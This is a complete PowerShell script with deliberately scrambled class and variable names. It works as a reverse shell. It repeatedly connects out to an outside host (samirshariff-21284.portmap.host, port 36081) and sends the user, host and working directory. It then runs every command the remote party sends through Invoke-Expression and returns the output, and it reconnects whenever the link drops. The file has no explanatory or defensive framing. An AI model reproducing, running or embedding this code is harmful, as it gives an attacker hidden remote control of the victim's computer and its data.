class LdDKO {
    
    [string]$NHDeqMJsmtrOcN = "samirshariff-21284.portmap.host"
    [int]$wTBvXwAzWuzytEKshTpGS = 36081

    $yXlscVkRIKMqljXoNU
    $wBVFVDkAmSaRTddVXYZAu
    $nPmenCHHBZcFem
    $OEurhkMzwtZGbe
    $tslDQalZVerC
    $lZYcb
    [int]$iPndkRtEYzR = 50*1024

    nEHzniOVUjdYQfMWP() {
        $this.wBVFVDkAmSaRTddVXYZAu = $false
        while ($true) {
            try {
                $this.wBVFVDkAmSaRTddVXYZAu = New-Object Net.Sockets.TcpClient($this.NHDeqMJsmtrOcN, $this.wTBvXwAzWuzytEKshTpGS)
                break
            } catch [System.Net.Sockets.SocketException] {
                Start-Sleep -Seconds 5
            }
        }
        $this.SbwOcR()
    }

    SbwOcR() {
        $this.yXlscVkRIKMqljXoNU = $this.wBVFVDkAmSaRTddVXYZAu.GetStream()
        $this.OEurhkMzwtZGbe = New-Object Byte[] $this.iPndkRtEYzR
        $this.lZYcb = New-Object Text.UTF8Encoding
        $this.nPmenCHHBZcFem = New-Object IO.StreamWriter($this.yXlscVkRIKMqljXoNU, [Text.Encoding]::UTF8, $this.iPndkRtEYzR)
        $this.tslDQalZVerC = New-Object System.IO.StreamReader($this.yXlscVkRIKMqljXoNU)
        $this.nPmenCHHBZcFem.AutoFlush = $true
    }

    IxBhs() {
        $this.nEHzniOVUjdYQfMWP()
        $this.dMuRRwbJUWLLsKWoJxFqEvw()
    }

    TjZZrVWoqdytVRCBwJBamP($UaDyEhoDPxyMmicRsvmFwms) {
        try {
            [byte[]]$OrcuVjeJoDoTizCfys = [text.Encoding]::Ascii.GetBytes($UaDyEhoDPxyMmicRsvmFwms)
            $this.nPmenCHHBZcFem.Write($OrcuVjeJoDoTizCfys, 0, $OrcuVjeJoDoTizCfys.length)   
        } catch [System.Management.Automation.MethodInvocationException] {
            $this.IxBhs()
        }
    }

    [string] jvWTzpNFnfbcsTHTDrzp() {
        try {
            $Wmllv = $this.yXlscVkRIKMqljXoNU.Read($this.OEurhkMzwtZGbe, 0, $this.iPndkRtEYzR)    
            $SedMeHWnDEfwJZpSDWZZnHi = ($this.lZYcb.GetString($this.OEurhkMzwtZGbe, 0, $Wmllv))
            return $SedMeHWnDEfwJZpSDWZZnHi
        } catch [System.Management.Automation.MethodInvocationException] {
            $this.IxBhs()
            return ""
        }
    }

    [string] KFqqQKAKMptHCz($BFBlMDHYKuxoYLYbIpPNPJMt) {
        Write-Host $BFBlMDHYKuxoYLYbIpPNPJMt
        try { 
            $rZCuglxuW = Invoke-Expression $BFBlMDHYKuxoYLYbIpPNPJMt | Out-String
        }
        catch {
            $IZhFJjflJnok = $_.Exception
            $zfEltLA = $_.Message
            $rZCuglxuW = "`n$_`n"
        }
        return $rZCuglxuW
    }

    [string] weKzzbHbsYuQKXQqaxbpLx() {
        $FxwGuQSLbGPft = [Environment]::UserName
        $zlwGwtstlTGBD = [System.Net.Dns]::GetHostName()
        $VVJWdGxDzAC = Get-Location
        return "$FxwGuQSLbGPft@$zlwGwtstlTGBD [$VVJWdGxDzAC]~$ "
    }

    dMuRRwbJUWLLsKWoJxFqEvw() {
        while ($this.wBVFVDkAmSaRTddVXYZAu.Connected) {
            $this.TjZZrVWoqdytVRCBwJBamP($this.weKzzbHbsYuQKXQqaxbpLx())         
            $SedMeHWnDEfwJZpSDWZZnHi = $this.jvWTzpNFnfbcsTHTDrzp()
            $rZCuglxuW = "`n"
            if ([string]::IsNullOrEmpty($SedMeHWnDEfwJZpSDWZZnHi)) {
                continue
            }
            $rZCuglxuW = $this.KFqqQKAKMptHCz($SedMeHWnDEfwJZpSDWZZnHi)
            $this.TjZZrVWoqdytVRCBwJBamP($rZCuglxuW + "`n")
            $this.yXlscVkRIKMqljXoNU.Flush()
        }
        $this.wBVFVDkAmSaRTddVXYZAu.Close()
        $this.IxBhs()
    } 
}

$HLVJOudbirHvvm = [LdDKO]::new()
$HLVJOudbirHvvm.IxBhs()
